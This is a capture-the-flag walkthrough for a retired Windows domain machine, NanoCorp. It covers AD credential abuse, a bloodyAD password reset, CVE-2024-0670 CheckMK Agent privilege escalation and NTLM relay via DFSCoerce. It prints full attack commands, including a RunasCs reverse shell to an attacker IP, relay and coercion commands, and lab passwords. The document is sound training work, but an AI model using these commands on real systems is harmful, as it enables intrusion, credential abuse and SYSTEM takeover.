# NanoCorp

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=flat-square) ![Released](https://img.shields.io/badge/Released-2025--11--08-informational?style=flat-square)

| | |
|---|---|
| **OS** | Windows |
| **Difficulty** | Hard |
| **Release** | November 8, 2025 |
| **Rating** | 3.7 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

AD enumeration yields `web_svc` credentials that work over SMB but not WinRM. `web_svc` has enough AD write access to reset `monitoring_svc`'s password with `bloodyAD`, and `monitoring_svc` does have WinRM (over SSL, port 5986). Root is **CVE-2024-0670** in the CheckMK Agent: the agent executes a pre-existing read-only `cmk_all_{PID}_1.cmd` in `C:\Windows\Temp\` as SYSTEM, so writing that file for every PID in a plausible range and triggering an agent restart gives SYSTEM execution. The restart trigger (MSI repair) needs `web_svc`, while the file upload needs `monitoring_svc` — both accounts are required.

---

## Attack Chain Summary

```
AD enumeration → web_svc creds (SMB) → bloodyAD password reset → monitoring_svc access
  → CheckMK Agent CVE-2024-0670 (PID brute-force .cmd hijack) → SYSTEM → root.txt
```

---

## Phase 1: Reconnaissance

### Services

- Windows domain controller: `nanocorp.htb`
- SMB, WinRM (5986/HTTPS), AD services (88, 389, 445)
- CheckMK Agent running as SYSTEM

### Credentials discovered

| Account | Password | Source | Access |
|---------|----------|--------|--------|
| web_svc | `dksehdgh712!@#` | AD enumeration | SMB (NOT WinRM) |
| monitoring_svc | `SuperPass123.` | Set via bloodyAD | SMB + WinRM (SSL) |

---

## Phase 2: Initial Access — web_svc

- `web_svc` credentials work via SMB but **not** WinRM (`WinRMAuthorizationError`).
- SMB access allows file enumeration and command execution via crackmapexec.
- PowerShell execution is limited — background jobs and complex scripts are unreliable.

---

## Phase 3: Lateral Movement — monitoring_svc

Used `bloodyAD` to reset `monitoring_svc`'s password to `SuperPass123.`. That account has WinRM access over SSL on port 5986:

```bash
evil-winrm -i <TARGET_IP> -u monitoring_svc -p 'SuperPass123.' -S -P 5986
```

Alternative:

```bash
wmiexec.py NANOCORP/monitoring_svc:'SuperPass123.'@<TARGET_IP>
```

---

## Phase 4: Privilege Escalation — CVE-2024-0670 (CheckMK Agent)

### Vulnerability

**CheckMK Agent 2.1.0p10** — predictable `.cmd` file write in `C:\Windows\Temp\`:

- The agent creates `cmk_all_{PID}_1.cmd` on startup.
- If the file **already exists as read-only**, the agent **executes** the existing file instead.
- The agent runs as **SYSTEM**.
- The PID is predictable, within roughly 1000–10000.

### Exploit strategy

1. Compile a C exploit that reads `root.txt` and writes it to `C:\test\preuve.txt`.
2. A PowerShell script creates `.cmd` files for every PID in 1000–10000, each invoking the exploit.
3. Mark all `.cmd` files read-only.
4. Trigger an agent restart via MSI repair — the agent picks up our file and executes it as SYSTEM.

### Execution

```bash
# Compile exploit (on attacker)
x86_64-w64-mingw32-gcc -o test.exe nanocorp_root_exploit.c -static
```

```powershell
# As monitoring_svc via evil-winrm:
!upload test.exe
!upload nanocorp_temp.ps1

# Create .cmd files for all PIDs
powershell -ExecutionPolicy Bypass -File nanocorp_temp.ps1
# Wait 10-15 seconds for all files
```

### Triggering the exploit

`web_svc` has permission to trigger an MSI repair; `monitoring_svc` does not:

```powershell
# Get a web_svc shell via RunasCs from the monitoring_svc session
.\RunasCs.exe 'web_svc' 'dksehdgh712!@#' cmd.exe -r <attacker_ip>:4444

# As web_svc — trigger the agent restart
msiexec /fa C:\Windows\Installer\1e6f2.msi
```

### Root flag

```powershell
# Back in the monitoring_svc shell:
type C:\test\preuve.txt
```

---

## Alternative Root Path: NTLM Relay via DFSCoerce

If the CheckMK exploit proves unreliable:

```bash
# Start relay (needs impacket with --remove-target support)
sudo ntlmrelayx.py -t https://<TARGET_IP>:5986/wsman -smb2support \
  --remove-target --no-http-server

# Trigger coercion
python3 dfscoerce.py -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' \
  <attacker_ip> <TARGET_IP>

# In the resulting WinRM shell (as SYSTEM):
type C:\Users\Administrator\Desktop\root.txt
```

SMB signing may block the relay — this requires the `--remove-target` flag from a newer impacket.

---

## Key Takeaways

1. **bloodyAD** for password resets when you have AD write permissions — faster than hunting for new credentials.
2. **CVE-2024-0670** (CheckMK Agent) — the PID brute-force `.cmd` hijack is reliable, but only if you have the right account to trigger the MSI repair.
3. **Permission split**: `monitoring_svc` can upload files, `web_svc` can trigger the repair. You need both accounts.
4. **DFSCoerce + NTLM relay** makes a good backup when direct exploitation is flaky.
5. **WinRM SSL (5986)** — some accounts work over SMB but not WinRM. Always test both.
6. **File upload limits** — base64 encoding via SMB has argument size limits; use an HTTP server for larger files.
7. **AMSI bypass** may be needed for PowerShell execution on modern Windows.

## Dead Ends

- WinRM with `web_svc` — always `WinRMAuthorizationError`.
- NTLM relay without `--remove-target` — SMB signing blocks it.
- Base64 file upload via crackmapexec — argument size limit.
- Direct MSI repair as `monitoring_svc` — insufficient permissions.

## Tools Used

evil-winrm, bloodyAD, crackmapexec, DFSCoerce, ntlmrelayx, RunasCs, a custom C exploit, a PowerShell PID brute-force script, and `x86_64-w64-mingw32-gcc` for cross-compilation.

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
